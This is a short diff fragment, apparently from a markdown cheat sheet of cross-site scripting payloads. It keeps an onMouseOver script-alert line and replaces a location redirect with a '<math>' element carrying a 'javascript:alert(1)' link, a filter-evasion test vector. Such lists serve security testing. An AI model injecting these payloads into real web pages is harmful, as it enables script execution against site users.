@@ -129,7 +129,7 @@ onMouseOver=<script>alert("/XSS BY Y000!/")</script>
 ### 
 
 ```
-location="http://google.com"
+<math><x href="javascript:alert(1)">blah
 ```
 ### 
 
